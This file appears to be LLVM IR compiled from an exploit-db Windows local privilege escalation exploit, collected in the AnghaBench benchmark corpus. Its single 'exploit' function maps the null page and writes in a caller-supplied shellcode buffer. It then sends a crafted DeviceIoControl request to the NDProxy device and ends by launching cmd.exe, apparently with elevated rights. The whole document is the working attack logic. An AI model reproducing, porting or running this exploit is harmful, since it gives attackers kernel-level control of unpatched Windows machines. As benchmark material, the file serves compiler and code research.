; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows_x86/local/extr_37732.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows_x86/local/extr_37732.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [4 x i8] c"xCC\00", align 1
@.str.1 = private unnamed_addr constant [40 x i8] c"[-] Attempt to map memory_write failed\0A\00", align 1
@.str.2 = private unnamed_addr constant [20 x i8] c"    Error code: %d\0A\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"\\\\.\\NDProxy\00", align 1
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [48 x i8] c"[-] Creating a device handle on NDProxy failed\0A\00", align 1
@.str.5 = private unnamed_addr constant [40 x i8] c"cmd.exe /T:C0 /K cd c:\\windows\\system32\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @exploit(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca [21 x i32], align 16
  %8 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %9 = call i32 (...) @InitFirstPage()
  %10 = call i64 @malloc(i32 400)
  %11 = inttoptr i64 %10 to i8*
  store i8* %11, i8** %5, align 8
  %12 = load i8*, i8** %5, align 8
  %13 = call i32 @memset(i8* %12, i32 ptrtoint ([4 x i8]* @.str to i32), i32 400)
  %14 = load i8*, i8** %5, align 8
  %15 = load i8*, i8** %2, align 8
  %16 = call i32 @memcpy(i8* %14, i8* %15, i32 112)
  %17 = load i8*, i8** %5, align 8
  %18 = call i32 @WriteProcessMemory(i64 4294967295, i32 1, i8* %17, i32 1024, i32* %3)
  store i32 %18, i32* %4, align 4
  %19 = load i32, i32* %4, align 4
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %26

21:                                               ; preds = %1
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0))
  %23 = call i32 (...) @GetLastError()
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i32 %23)
  %25 = call i32 @exit(i32 1) #4
  unreachable

26:                                               ; preds = %1
  %27 = load i32, i32* @OPEN_EXISTING, align 4
  %28 = call i64 @CreateFileA(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0), i32 0, i32 0, i32* null, i32 %27, i32 0, i32* null)
  store i64 %28, i64* %6, align 8
  %29 = load i64, i64* %6, align 8
  %30 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %31 = icmp eq i64 %29, %30
  br i1 %31, label %32, label %37

32:                                               ; preds = %26
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.4, i64 0, i64 0))
  %34 = call i32 (...) @GetLastError()
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i32 %34)
  %36 = call i32 @exit(i32 0) #4
  unreachable

37:                                               ; preds = %26
  %38 = bitcast [21 x i32]* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %38, i8 0, i64 84, i1 false)
  store i32 0, i32* %8, align 4
  %39 = getelementptr inbounds [21 x i32], [21 x i32]* %7, i64 0, i64 0
  %40 = getelementptr inbounds i32, i32* %39, i64 5
  store i32 117637413, i32* %40, align 4
  %41 = getelementptr inbounds [21 x i32], [21 x i32]* %7, i64 0, i64 0
  %42 = getelementptr inbounds i32, i32* %41, i64 7
  store i32 52, i32* %42, align 4
  %43 = load i64, i64* %6, align 8
  %44 = getelementptr inbounds [21 x i32], [21 x i32]* %7, i64 0, i64 0
  %45 = getelementptr inbounds [21 x i32], [21 x i32]* %7, i64 0, i64 0
  %46 = call i32 @DeviceIoControl(i64 %43, i32 -1879104564, i32* %44, i32 84, i32* %45, i32 36, i32* %8, i32 0)
  %47 = load i64, i64* %6, align 8
  %48 = call i32 @CloseHandle(i64 %47)
  %49 = call i32 @system(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.5, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @InitFirstPage(...) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @WriteProcessMemory(i64, i32, i8*, i32, i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @GetLastError(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @CreateFileA(i8*, i32, i32, i32*, i32, i32, i32*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #3

declare dso_local i32 @DeviceIoControl(i64, i32, i32*, i32, i32*, i32, i32*, i32) #1

declare dso_local i32 @CloseHandle(i64) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
